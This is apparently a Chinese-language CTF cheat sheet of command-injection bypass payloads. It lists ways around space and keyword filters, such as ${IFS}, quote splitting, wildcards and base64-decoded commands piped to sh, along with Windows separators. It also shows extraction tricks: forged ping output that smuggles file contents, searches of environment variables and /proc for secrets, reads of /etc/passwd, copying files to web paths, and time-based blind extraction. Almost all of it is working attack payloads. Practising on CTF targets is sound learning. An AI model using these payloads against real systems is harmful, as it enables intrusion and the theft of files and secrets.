# 命令注入绕过技术大全

## 空格被过滤的替代方案
```
${IFS}        → cat${IFS}/flag       (最常用，Bash 内置字段分隔符)
%09           → cat%09/flag          (Tab 字符，URL 编码)
$IFS$9        → cat$IFS$9/flag       ($9 是空的位置参数)
{cmd,arg}     → {cat,/flag}          (Bash 花括号展开)
<             → cat</flag            (输入重定向)
<>            → cat<>/etc/passwd     (读写重定向)
%20           → cat%20/flag          (URL 编码空格)
```

## 关键字过滤绕过

### cat 被过滤时的替代命令
```bash
tac /flag              # 反向输出
nl /flag               # 带行号输出
head /flag
tail /flag
sort /flag
rev /flag | rev        # 双重反转
xxd /flag              # 十六进制输出
base64 /flag           # Base64 编码输出
```

### 字符串拼接绕过
```bash
c'a't /flag            # 单引号中断
c""at /flag            # 双引号中断
c\at /flag             # 反斜杠转义
/bin/ca? /flag         # 通配符匹配
/bin/c[a]t /flag       # 字符类匹配
```

### 变量拼接
```bash
a=ca;b=t;$a$b /flag
```

### 编码绕过
```bash
echo Y2F0IC9mbGFn | base64 -d | sh
$(printf '\x63\x61\x74') /etc/passwd    # printf 十六进制编码
```

### 通配符
```bash
cat /fla*
cat /FL?G.txt
/???/??t /???/p??s??                     # 全路径通配
```

## Windows 命令注入

### 分隔符
```
& dir                  # 无条件执行
| dir                  # 管道
&& dir                 # AND
|| dir                 # OR
%0a dir                # 换行
```

注意：Windows 不支持反引号和 `$()`

### 空格绕过
```
type,C:\flag.txt       # 逗号分隔
```

### 变量绕过
```
set a=who&&set b=ami&&%a%%b%
```

## 输出被过滤/解析时的数据外泄

### 格式化输出绕过解析器
核心原理：用 `%0a` 放在输入最前面，让原命令没有参数→失败→只有你的 echo 输出
```
ip_address=%0aecho "$(cat /FLAG.txt) packets transmitted, 0 received, 100% packet loss"
```
注意：`%0a` 必须在最前面，不要在前面加 IP！

### 读源码找过滤逻辑和 flag 路径
```
ip_address=%0aecho "$(cat /app/app.py) packets transmitted, 0 received, 100% packet loss"
ip_address=%0aecho "$(cat /Dockerfile) packets transmitted, 0 received, 100% packet loss"
```

### 系统性 Flag 搜索（找不到 flag 时必用！）

⛔ 不要只试固定路径！用 `find` 命令系统搜索：
```
%0afind / -name "*flag*" -o -name "*FLAG*" 2>/dev/null | head -20
%0afind / -name "*.txt" -maxdepth 2 2>/dev/null
%0als -la /
%0als -la /app/
%0aenv | grep -i flag
%0acat /proc/1/environ | tr '\0' '\n' | grep -i flag
```

### 正则匹配伪造（输出解析器绕过核心）

当应用用正则提取 ping 结果（如匹配 `(\d+) packets transmitted`）时，
伪造符合正则的输出 + 嵌入 flag：
```
%0aecho "$(cat /FLAG.txt) packets transmitted, 0 received, 100% packet loss"
```

**通用模式**：先读源码找正则 → 构造匹配的输出格式 → 在匹配字段中嵌入 flag
```
# 读应用源码找正则
%0acat /app/app.py
# 读 Dockerfile 找 flag 路径
%0acat /Dockerfile
```

### 写文件到 Web 可访问路径
```
ip_address=127.0.0.1;cp /FLAG.txt /app/static/f.txt
```
然后访问 http://target/static/f.txt

### 时间盲注（完全无输出时）
```
ip_address=127.0.0.1;sleep $(cat /flag | cut -c1 | od -An -td1)
```
